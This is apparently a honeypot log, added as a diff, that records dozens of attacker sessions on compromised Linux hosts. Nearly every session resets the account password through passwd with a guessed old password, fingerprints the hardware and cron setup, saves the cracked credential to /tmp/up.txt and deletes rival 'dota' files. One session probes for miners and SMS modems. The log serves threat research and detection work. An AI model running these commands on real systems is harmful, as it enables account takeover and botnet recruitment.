+echo "pass@123\nVHuttsL0AfnI\nVHuttsL0AfnI\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin pass@123" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 94734eb9418b
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "nimda\nNk2SlIZ0Fs2q\nNk2SlIZ0Fs2q"|passwd|bash
+echo "nimda\nNk2SlIZ0Fs2q\nNk2SlIZ0Fs2q\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin nimda" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: df41b1e240ae
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "nimda\nSTmTt9NmoBfT\nSTmTt9NmoBfT"|passwd|bash
+echo "nimda\nSTmTt9NmoBfT\nSTmTt9NmoBfT\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin nimda" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 9f25f8ff753c
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "123456\nJwvUExF1srrt\nJwvUExF1srrt"|passwd|bash
+echo "123456\nJwvUExF1srrt\nJwvUExF1srrt\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin 123456" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 3978277b5931
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "123admin123\neaJigidHTCoB\neaJigidHTCoB"|passwd|bash
+echo "123admin123\neaJigidHTCoB\neaJigidHTCoB\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin 123admin123" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 3e413c7937bd
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "smcadmin\nM7GCaBSPfoC3\nM7GCaBSPfoC3"|passwd|bash
+echo "smcadmin\nM7GCaBSPfoC3\nM7GCaBSPfoC3\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin smcadmin" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: ed4c78d95b6f
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "q1w2e3r4t5y6\nh4LdBN6xOKJE\nh4LdBN6xOKJE"|passwd|bash
+echo "q1w2e3r4t5y6\nh4LdBN6xOKJE\nh4LdBN6xOKJE\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin q1w2e3r4t5y6" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 90f0f1bdaa68
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "123admin123\njDOFbnQtM9OK\njDOFbnQtM9OK"|passwd|bash
+echo "123admin123\njDOFbnQtM9OK\njDOFbnQtM9OK\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin 123admin123" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 9f6e81d86507
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "qmfltmqjs!@#$\nMLzgCajb332M\nMLzgCajb332M"|passwd|bash
+echo "qmfltmqjs!@#$\nMLzgCajb332M\nMLzgCajb332M\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin qmfltmqjs!@#$" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 397fa6bec32b
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "123456789\nMd3vpGVyXfB7\nMd3vpGVyXfB7"|passwd|bash
+echo "123456789\nMd3vpGVyXfB7\nMd3vpGVyXfB7\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin 123456789" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: da036867fe6a
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "54321\nS7p6LiRZEjoZ\nS7p6LiRZEjoZ"|passwd|bash
+echo "54321\nS7p6LiRZEjoZ\nS7p6LiRZEjoZ\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin 54321" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 143cd7090599
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "(none)\nqcy3QsYBCYaj\nqcy3QsYBCYaj"|passwd|bash
+echo "(none)\nqcy3QsYBCYaj\nqcy3QsYBCYaj\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin (none)" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: d198e85ac60c
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "songswell\nnwV0PYD4tCKd\nnwV0PYD4tCKd"|passwd|bash
+echo "songswell\nnwV0PYD4tCKd\nnwV0PYD4tCKd\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin songswell" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: d73a5fc92131
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "123123\nIuMu8I2Xrzo3\nIuMu8I2Xrzo3"|passwd|bash
+echo "123123\nIuMu8I2Xrzo3\nIuMu8I2Xrzo3\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin 123123" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: cd28b4edd573
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "songswell\nnwV0PYD4tCKd\nnwV0PYD4tCKd"|passwd|bash
+echo "songswell\nnwV0PYD4tCKd\nnwV0PYD4tCKd\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin songswell" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 3ef6842d3a54
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "123admin123\ngZXBtBDMMfab\ngZXBtBDMMfab"|passwd|bash
+echo "123admin123\ngZXBtBDMMfab\ngZXBtBDMMfab\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin 123admin123" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: b239621d0a07
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "songswell\nRE5MdxBXD4tS\nRE5MdxBXD4tS"|passwd|bash
+echo "songswell\nRE5MdxBXD4tS\nRE5MdxBXD4tS\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin songswell" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: be0e77d0739d
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "letmein\nRYb92xtdj8DX\nRYb92xtdj8DX"|passwd|bash
+echo "letmein\nRYb92xtdj8DX\nRYb92xtdj8DX\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin letmein" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 65e833f5fb12
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "letmein\nRYb92xtdj8DX\nRYb92xtdj8DX"|passwd|bash
+echo "letmein\nRYb92xtdj8DX\nRYb92xtdj8DX\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin letmein" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 049b89fe7ca8
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "letmein\nRYb92xtdj8DX\nRYb92xtdj8DX"|passwd|bash
+echo "letmein\nRYb92xtdj8DX\nRYb92xtdj8DX\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin letmein" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 33109bf6be61
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "pass@123\nG3TR6HMQu4Se\nG3TR6HMQu4Se"|passwd|bash
+echo "pass@123\nG3TR6HMQu4Se\nG3TR6HMQu4Se\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin pass@123" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 0dc51ebac14b
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "nospam\nmAWH32OR3t07\nmAWH32OR3t07"|passwd|bash
+echo "nospam\nmAWH32OR3t07\nmAWH32OR3t07\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin nospam" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 1505edfe0342
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "articon\nWqVx0CnPxni4\nWqVx0CnPxni4"|passwd|bash
+echo "articon\nWqVx0CnPxni4\nWqVx0CnPxni4\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin articon" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: a857d70281bb
+/ip cloud print
+ifconfig
+uname -a
+cat /proc/cpuinfo
+ps | grep '[Mm]iner'
+ps -ef | grep '[Mm]iner'
+ls -la /dev/ttyGSM* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
+echo Hi | cat -n
+
+Session ID: 55b92acd8fb6
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "p@ssw0rd\nZqwOHVglTPm6\nZqwOHVglTPm6"|passwd|bash
+echo "p@ssw0rd\nZqwOHVglTPm6\nZqwOHVglTPm6\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin p@ssw0rd" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 042dfcd65ae4
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "!QAZxsw2\nr56PMBzM0CnY\nr56PMBzM0CnY"|passwd|bash
+echo "!QAZxsw2\nr56PMBzM0CnY\nr56PMBzM0CnY\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin !QAZxsw2" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 4e6dd6a8597f
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "administrador\nTPxazDSN4nyQ\nTPxazDSN4nyQ"|passwd|bash
+echo "administrador\nTPxazDSN4nyQ\nTPxazDSN4nyQ\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin administrador" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 98a06fd833ac
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "nospam\nWCPOdRSDwv8A\nWCPOdRSDwv8A"|passwd|bash
+echo "nospam\nWCPOdRSDwv8A\nWCPOdRSDwv8A\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin nospam" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 08da4a9695c6
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "1qaz@WSX\ncglJhyy714tz\ncglJhyy714tz"|passwd|bash
+echo "1qaz@WSX\ncglJhyy714tz\ncglJhyy714tz\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin 1qaz@WSX" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 2856b35b2f7f
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "nospam\n3K5TGg1eyvOT\n3K5TGg1eyvOT"|passwd|bash
+echo "nospam\n3K5TGg1eyvOT\n3K5TGg1eyvOT\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin nospam" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: d4abd29f81ae
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "qmfltmqjs!@#$\ny9NAEGu9fkZZ\ny9NAEGu9fkZZ"|passwd|bash
+echo "qmfltmqjs!@#$\ny9NAEGu9fkZZ\ny9NAEGu9fkZZ\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin qmfltmqjs!@#$" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 7020637c2bb9
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "nospam\nCxyfYOXcoNW7\nCxyfYOXcoNW7"|passwd|bash
+echo "nospam\nCxyfYOXcoNW7\nCxyfYOXcoNW7\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin nospam" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: d5a101ce70ea
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "sysadmin\nnpbhU3xDqQ4Q\nnpbhU3xDqQ4Q"|passwd|bash
+echo "sysadmin\nnpbhU3xDqQ4Q\nnpbhU3xDqQ4Q\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin sysadmin" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 0b69df59f543
+LC_ALL=C top -bn1
+
+Session ID: 75f8a1c2cb6c
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "!QAZxsw2\n8lKX5DDF14fH\n8lKX5DDF14fH"|passwd|bash
+echo "!QAZxsw2\n8lKX5DDF14fH\n8lKX5DDF14fH\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin !QAZxsw2" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: b70d6b9b735b
+LC_ALL=C top -bn1
+
+Session ID: 52ab17f77a59
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "q1w2e3\ngRRXEM0doPMF\ngRRXEM0doPMF"|passwd|bash
+echo "q1w2e3\ngRRXEM0doPMF\ngRRXEM0doPMF\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin q1w2e3" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 1831b3ad84e2
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "1q2w3e4r5t6y\ntsP0JK3XXc7V\ntsP0JK3XXc7V"|passwd|bash
+echo "1q2w3e4r5t6y\ntsP0JK3XXc7V\ntsP0JK3XXc7V\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin 1q2w3e4r5t6y" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: d1aebad1d95c
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "admin123456\ntqCKiocXTuCb\ntqCKiocXTuCb"|passwd|bash
+echo "admin123456\ntqCKiocXTuCb\ntqCKiocXTuCb\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin admin123456" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 8ff733774329
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "admin123456\nGUuWFtKMu9ED\nGUuWFtKMu9ED"|passwd|bash
+echo "admin123456\nGUuWFtKMu9ED\nGUuWFtKMu9ED\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
